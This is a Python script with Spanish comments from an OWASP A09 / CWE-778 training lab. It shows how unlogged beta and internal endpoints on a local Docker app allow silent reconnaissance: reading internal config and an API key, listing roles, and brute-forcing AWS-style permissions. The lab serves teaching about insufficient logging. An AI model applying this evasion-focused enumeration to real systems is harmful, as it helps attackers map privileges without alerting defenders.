#!/usr/bin/env python3
# ============================================================================
# recon_script.py — Script de Reconocimiento / Explotación
# OWASP A09 Lab — CWE-778: Insufficient Logging
# ============================================================================
# Este script simula a un atacante que:
#   1. Realiza peticiones a endpoints de PRODUCCIÓN (generan logs).
#   2. Realiza peticiones a endpoints BETA/INTERNOS (NO generan logs).
#   3. Enumera permisos de forma masiva sin dejar rastro.
#
# Después de ejecutar este script, revisa los logs del contenedor:
#   docker logs owasp-a09-cwe778-lab
#
# Observarás que SOLO las peticiones a /api/v1/* quedaron registradas.
# Las peticiones a /api/beta/* y /api/internal/* son INVISIBLES.
# ============================================================================

import requests
import json
import sys
from datetime import datetime

# ─── Configuración ───────────────────────────────────────────────────────────
BASE_URL = "http://localhost:3000"
TOKENS = {
    "admin":     "token-admin-001",
    "developer": "token-dev-042",
    "auditor":   "token-readonly-099"
}

# Lista de permisos AWS comunes para enumeración
AWS_PERMISSIONS = [
    "iam:CreateUser",
    "iam:DeleteUser",
    "iam:AttachPolicy",
    "iam:DetachPolicy",
    "iam:CreateRole",
    "ec2:RunInstances",
    "ec2:TerminateInstances",
    "ec2:DescribeInstances",
    "s3:GetObject",
    "s3:PutObject",
    "s3:DeleteBucket",
    "s3:ListBucket",
    "lambda:InvokeFunction",
    "lambda:CreateFunction",
    "cloudtrail:StopLogging",
    "cloudtrail:DeleteTrail",
    "globalaccelerator:FullAccess",
    "rds:DeleteDBInstance",
    "kms:Decrypt",
    "sts:AssumeRole"
]

# ─── Utilidades ──────────────────────────────────────────────────────────────

def banner():
    print("=" * 70)
    print(" 🔍 RECON SCRIPT — OWASP A09 / CWE-778: Insufficient Logging")
    print("    Simulación de Enumeración Silenciosa de Permisos")
    print("=" * 70)
    print()

def section(title):
    print()
    print(f"{'─' * 70}")
    print(f" 📌 {title}")
    print(f"{'─' * 70}")

def log_request(method, url, status, logged):
    icon = "📝" if logged else "👻"
    label = "REGISTRADO" if logged else "SILENCIOSO"
    print(f"  {icon} [{label}] {method} {url} → HTTP {status}")

def make_request(method, path, token=None, data=None, logged=True):
    """Realiza una petición HTTP y muestra el resultado."""
    url = f"{BASE_URL}{path}"
    headers = {}
    if token:
        headers["x-auth-token"] = token
    headers["User-Agent"] = "ReconScript/1.0 (CWE-778-Exploit)"

    try:
        if method == "GET":
            resp = requests.get(url, headers=headers, timeout=5)
        elif method == "POST":
            resp = requests.post(url, headers=headers, json=data or {}, timeout=5)
        else:
            return None

        log_request(method, path, resp.status_code, logged)
        return resp
    except requests.exceptions.ConnectionError:
        print(f"  ❌ ERROR: No se pudo conectar a {url}")
        print(f"     ¿Está corriendo el contenedor? → docker-compose up -d")
        return None


# ============================================================================
# FASE 1: Peticiones a endpoints de PRODUCCIÓN (dejan rastro en CloudTrail)
# ============================================================================

def phase1_production_requests():
    section("FASE 1: Peticiones a endpoints de PRODUCCIÓN (con CloudTrail)")
    print("  Estas peticiones QUEDARÁN registradas en los logs del contenedor.\n")

    token = TOKENS["developer"]

    # GET /api/v1/status
    resp = make_request("GET", "/api/v1/status", logged=True)
    if resp:
        print(f"    → Servicio: {resp.json().get('service', 'N/A')}")

    # GET /api/v1/users
    resp = make_request("GET", "/api/v1/users", token=token, logged=True)
    if resp and resp.status_code == 200:
        users = resp.json().get("data", [])
        print(f"    → Usuarios encontrados: {len(users)}")
        for u in users:
            print(f"       • {u['username']} ({u['role']})")

    # POST /api/v1/data
    resp = make_request("POST", "/api/v1/data", token=token,
                        data={"payload": "test"}, logged=True)
    if resp and resp.status_code == 200:
        print(f"    → Record ID: {resp.json().get('recordId', 'N/A')}")


# ============================================================================
# FASE 2: Reconocimiento SILENCIOSO en endpoints beta/internos
# ============================================================================

def phase2_silent_recon():
    section("FASE 2: Reconocimiento SILENCIOSO (SIN CloudTrail)")
    print("  Estas peticiones NO aparecerán en los logs del contenedor.\n")

    # ── 2a: Obtener configuración interna (sin autenticación) ──
    print("  [2a] Descubriendo configuración interna...")
    resp = make_request("GET", "/api/internal/config", logged=False)
    if resp and resp.status_code == 200:
        config = resp.json()
        print(f"    → Rutas monitoreadas:     {config.get('loggingScope', 'N/A')}")
        print(f"    → Rutas NO monitoreadas:  {config.get('unmonitoredPaths', 'N/A')}")
        print(f"    → Debug mode:             {config.get('debugMode', 'N/A')}")
        api_key = config.get('internalApiKey', 'N/A')
        print(f"    → 🔑 API Key interna:     {api_key}")
    print()

    # ── 2b: Obtener roles del sistema ──
    print("  [2b] Enumerando roles del sistema...")
    resp = make_request("GET", "/api/internal/roles", logged=False)
    if resp and resp.status_code == 200:
        roles = resp.json().get("roles", [])
        for r in roles:
            escalate = "⚠️  SÍ" if r.get("canEscalate") else "No"
            print(f"    → {r['role']:20s} | Nivel: {r['level']:10s} | Escalable: {escalate}")
    print()

    # ── 2c: Enumerar permisos de cada usuario ──
    print("  [2c] Enumerando permisos por usuario...")
    for user_label, token in TOKENS.items():
        resp = make_request("GET", "/api/beta/permissions/check",
                            token=token, logged=False)
        if resp and resp.status_code == 200:
            data = resp.json()
            perms = data.get("permissions", [])
            print(f"\n    👤 {data['username']} ({data['role']}):")
            for p in perms:
                critical = " ← 🚨 CRÍTICO" if p in [
                    "cloudtrail:StopLogging", "iam:DeleteUser",
                    "ec2:TerminateInstances", "s3:DeleteBucket",
                    "globalaccelerator:FullAccess"
                ] else ""
                print(f"       ✓ {p}{critical}")


# ============================================================================
# FASE 3: Enumeración masiva de permisos (brute force silencioso)
# ============================================================================

def phase3_permission_bruteforce():
    section("FASE 3: Enumeración masiva de permisos (Brute Force Silencioso)")
    print("  Probando 20 permisos AWS contra el token del admin...\n")

    token = TOKENS["admin"]
    granted = []
    denied = []

    for perm in AWS_PERMISSIONS:
        resp = make_request(
            "GET",
            f"/api/beta/permissions/enumerate?permission={perm}",
            token=token,
            logged=False
        )
        if resp and resp.status_code == 200:
            data = resp.json()
            if data.get("granted"):
                granted.append(perm)
            else:
                denied.append(perm)

    print(f"\n  📊 Resultados de la enumeración:")
    print(f"     Total probados:  {len(AWS_PERMISSIONS)}")
    print(f"     ✅ Concedidos:   {len(granted)}")
    print(f"     ❌ Denegados:    {len(denied)}")
    print()
    print(f"  Permisos concedidos al admin:")
    for p in granted:
        critical = " ← 🚨" if "Delete" in p or "Stop" in p or "Terminate" in p else ""
        print(f"     ✓ {p}{critical}")


# ============================================================================
# RESUMEN FINAL
# ============================================================================

def summary():
    section("RESUMEN DEL ATAQUE")
    print("""
  ┌─────────────────────────────────────────────────────────────────┐
  │                                                                 │
  │  FASE 1 (Producción):                                          │
  │    → 3 peticiones realizadas                                    │
  │    → 📝 TODAS registradas en CloudTrail (docker logs)           │
  │                                                                 │
  │  FASE 2 (Reconocimiento silencioso):                            │
  │    → Configuración interna, roles y permisos extraídos          │
  │    → 👻 NINGUNA petición registrada en CloudTrail               │
  │                                                                 │
  │  FASE 3 (Brute Force silencioso):                               │
  │    → 20 permisos enumerados contra el usuario admin             │
  │    → 👻 NINGUNA petición registrada en CloudTrail               │
  │                                                                 │
  │  ⚡ IMPACTO:                                                    │
  │    Un atacante puede mapear completamente los privilegios       │
  │    de cualquier cuenta sin que el equipo de seguridad           │
  │    reciba NINGUNA alerta.                                       │
  │                                                                 │
  │  🔎 VERIFICACIÓN:                                               │
  │    Ejecuta: docker logs owasp-a09-cwe778-lab                    │
  │    Solo verás las 3 peticiones de la Fase 1.                    │
  │    Las ~30 peticiones de las Fases 2 y 3 son INVISIBLES.        │
  │                                                                 │
  └─────────────────────────────────────────────────────────────────┘
""")


# ============================================================================
# MAIN
# ============================================================================

if __name__ == "__main__":
    banner()

    print(f"  🕐 Inicio: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print(f"  🎯 Objetivo: {BASE_URL}")
    print()

    # Verificar conexión
    try:
        requests.get(f"{BASE_URL}/", timeout=3)
    except requests.exceptions.ConnectionError:
        print("  ❌ ERROR: No se puede conectar al servidor.")
        print("  ¿Ejecutaste 'docker-compose up -d'?")
        sys.exit(1)

    phase1_production_requests()
    phase2_silent_recon()
    phase3_permission_bruteforce()
    summary()

    print(f"  🕐 Fin: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
    print()
